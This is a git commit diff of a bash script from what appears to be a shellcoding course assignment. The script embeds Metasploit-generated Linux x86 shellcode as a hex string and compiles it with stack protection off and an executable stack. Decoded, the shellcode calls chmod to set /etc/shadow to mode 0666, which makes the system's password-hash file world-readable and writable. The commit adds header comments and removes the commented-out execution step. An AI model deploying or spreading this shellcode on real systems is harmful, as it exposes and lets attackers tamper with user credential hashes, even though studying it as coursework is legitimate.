75d29be6d22b369b599777b55da7fa55fa134bc1
Mr Squid <47063311+MrSquid25@users.noreply.github.com>
2019-01-31 18:47:51 +0100

    Update chmod_compile.sh

--- Assignment 5/chmod/chmod_compile.sh
+++ Assignment 5/chmod/chmod_compile.sh
@@ -1,11 +1,14 @@
 #!/bin/bash
 
+#Filename: Chmod-compile.sh
+#Author:  MrSquid
+#Purpose: Chmod-compiler.
+
 echo "[+] Generating code using metasploit..."
 
-#code=$(msfvenom -p linux/x86/chmod  -f c) #Shellcode generated to objdump
+#msfvenom -p linux/x86/chmod  -f c  --> Shellcode generated to objdump
 
 objdump="\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80";
-#objdump=$(objdump -d ./$code|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g')
 
 sleep 3
 
@@ -19,6 +22,3 @@ sleep 2
 
 gcc -fno-stack-protector -z execstack shellcode.c -o shellcode &>/dev/null #Compile and execute the shellcode
 
-#echo "[+] Executing chmod..."
-
-#./shellcode
